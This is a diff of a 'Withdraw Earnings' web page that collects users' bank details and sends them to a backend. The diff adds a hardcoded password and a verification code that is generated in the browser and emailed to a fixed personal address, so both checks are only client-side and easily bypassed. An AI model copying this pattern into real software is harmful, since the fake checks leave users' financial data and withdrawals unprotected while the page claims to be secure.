@@ -18,96 +18,36 @@
       padding: 20px;
     }
 
-    h1 {
-      font-size: 1.8rem;
-      color: #00e0ff;
-      text-align: center;
-      margin-bottom: 10px;
-    }
+    h1 { font-size: 1.8rem; color: #00e0ff; text-align: center; margin-bottom: 10px; }
 
-    .card {
-      background: #161622;
-      border-radius: 20px;
-      box-shadow: 0 0 20px #00ffff30;
-      padding: 25px;
-      width: 100%;
-      max-width: 420px;
-      box-sizing: border-box;
-    }
+    .card { background: #161622; border-radius: 20px; box-shadow: 0 0 20px #00ffff30; padding: 25px; width: 100%; max-width: 420px; box-sizing: border-box; }
 
-    label {
-      display: block;
-      margin: 12px 0 6px;
-      font-size: 0.9rem;
-      color: #bbb;
-    }
+    label { display: block; margin: 12px 0 6px; font-size: 0.9rem; color: #bbb; }
 
-    input {
-      width: 100%;
-      padding: 10px;
-      border-radius: 10px;
-      border: none;
-      outline: none;
-      background: #1f1f2f;
-      color: #fff;
-      font-size: 1rem;
-    }
+    input { width: 100%; padding: 10px; border-radius: 10px; border: none; outline: none; background: #1f1f2f; color: #fff; font-size: 1rem; }
+    input:focus { box-shadow: 0 0 8px #00ffff80; }
 
-    input:focus {
-      box-shadow: 0 0 8px #00ffff80;
-    }
+    button { width: 100%; margin-top: 20px; padding: 12px; border: none; border-radius: 25px; background: linear-gradient(90deg, #00e0ff, #00ffb7); color: #000; font-weight: 600; font-size: 1rem; cursor: pointer; transition: 0.3s; }
+    button:hover { transform: scale(1.03); box-shadow: 0 0 15px #00ffff60; }
 
-    button {
-      width: 100%;
-      margin-top: 20px;
-      padding: 12px;
-      border: none;
-      border-radius: 25px;
-      background: linear-gradient(90deg, #00e0ff, #00ffb7);
-      color: #000;
-      font-weight: 600;
-      font-size: 1rem;
-      cursor: pointer;
-      transition: 0.3s;
-    }
+    .back { margin-top: 15px; text-align: center; color: #00e0ff; cursor: pointer; font-size: 0.95rem; }
+    .back:hover { text-decoration: underline; }
 
-    button:hover {
-      transform: scale(1.03);
-      box-shadow: 0 0 15px #00ffff60;
-    }
-
-    .back {
-      margin-top: 15px;
-      text-align: center;
-      color: #00e0ff;
-      cursor: pointer;
-      font-size: 0.95rem;
-    }
-
-    .back:hover {
-      text-decoration: underline;
-    }
-
-    footer {
-      text-align: center;
-      margin-top: 25px;
-      color: #666;
-      font-size: 0.85rem;
-    }
+    footer { text-align: center; margin-top: 25px; color: #666; font-size: 0.85rem; }
   </style>
 </head>
 <body>
   <h1 id="withdrawTitle">Withdraw Earnings</h1>
-  
+
   <div class="card">
     <label for="provider">Network Provider</label>
     <input id="provider" type="text" placeholder="e.g. MTN" required readonly>
 
     <label for="accountName">Account Name</label>
-    <input id="accountName" type="text" placeholder="John Doe" required>
+    <input id="accountName" type="text" placeholder="bank account name" required>
 
     <label for="accountNumber">Account Number</label>
-    <input id="accountNumber" type="text" placeholder="0123456789" required>
+    <input id="accountNumber" type="text" placeholder="bank account number" required>
 
     <label for="bankName">Bank Name</label>
     <input id="bankName" type="text" placeholder="e.g. Access Bank" required>
@@ -116,10 +56,10 @@
     <input id="email" type="email" placeholder="your@email.com" required>
 
     <label for="phone">Phone Number</label>
-    <input id="phone" type="tel" placeholder="08012345678" required>
+    <input id="phone" type="tel" placeholder="Phone number" required>
 
     <label for="amount">Withdrawal Amount (₦)</label>
-    <input id="amount" type="number" placeholder="5000" required>
+    <input id="amount" type="number" placeholder="50000" required>
 
     <label for="companyEmail">Company Email (Provider)</label>
     <input id="companyEmail" type="email" placeholder="company@provider.com" required>
@@ -127,7 +67,7 @@
     <label for="currentBalance">Current Balance (₦)</label>
     <input id="currentBalance" type="number" placeholder="15000" required>
 
-    <button onclick="sendWithdrawal()">📩 Send Withdrawal Request</button>
+    <button onclick="checkPassword()">📩 Send Withdrawal Request</button>
   </div>
 
   <div class="back" onclick="window.location.href='ta.html'">⬅ Back to Dashboard</div>
@@ -135,10 +75,52 @@
   <footer>© 2025 King Charmer Network | Secure Withdrawal System</footer>
 
   <script>
-    // 🔗 Replace with your actual Render backend URL
     const apiBase = "https://kingcharmer-analytics-co-ng.onrender.com";
+    const PASSWORD = "4029";
+    let verificationCode = "";
 
-    // 🌐 Send withdrawal request
+    function checkPassword() {
+      const userPass = prompt("⚠️ Enter your withdrawal password:");
+      if (userPass !== PASSWORD) {
+        alert("❌ Wrong password! Withdrawal denied.");
+        return;
+      }
+      sendVerificationCode();
+    }
+
+    function generateCode() {
+      return Math.floor(100000 + Math.random() * 900000).toString(); // 6-digit
+    }
+
+    async function sendVerificationCode() {
+      verificationCode = generateCode();
+      const email = "diamondjerry0099@gmail.com";
+
+      try {
+        const res = await fetch(`${apiBase}/api/send-verification-email`, {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({ email, code: verificationCode })
+        });
+
+        const result = await res.json();
+        alert(result.message || "✅ Verification code sent to email!");
+        promptCodeInput();
+      } catch (err) {
+        console.error(err);
+        alert("❌ Failed to send verification email.");
+      }
+    }
+
+    function promptCodeInput() {
+      const userCode = prompt("Enter the 6-digit verification code sent to your email:");
+      if (userCode !== verificationCode) {
+        alert("❌ Wrong verification code. Withdrawal canceled.");
+        return;
+      }
+      sendWithdrawal();
+    }
+
     async function sendWithdrawal() {
       const data = {
         provider: document.getElementById("provider").value,
@@ -152,7 +134,6 @@
         currentBalance: document.getElementById("currentBalance").value
       };
 
-      // 🧠 Validation
       if (Object.values(data).some(v => !v.trim())) {
         alert("⚠️ Please fill in all fields before submitting.");
         return;
@@ -167,21 +148,18 @@
 
         const result = await res.json();
         alert(result.message || "Withdrawal request sent successfully!");
-        window.location.href = "ta.html"; // ✅ Redirect after success
+        window.location.href = "ta.html";
       } catch (err) {
         console.error("Error sending request:", err);
         alert("❌ Something went wrong. Please try again later.");
       }
     }
 
-    // 🧩 Load provider from localStorage
     const provider = localStorage.getItem("selectedProvider");
     if (provider) {
       document.title = `Withdraw Earnings - ${provider}`;
       document.getElementById("provider").value = provider;
       document.getElementById("withdrawTitle").textContent = `Withdraw Earnings - ${provider}`;
-    } else {
-      document.getElementById("withdrawTitle").textContent = "Withdraw Earnings";
     }
   </script>
 </body>
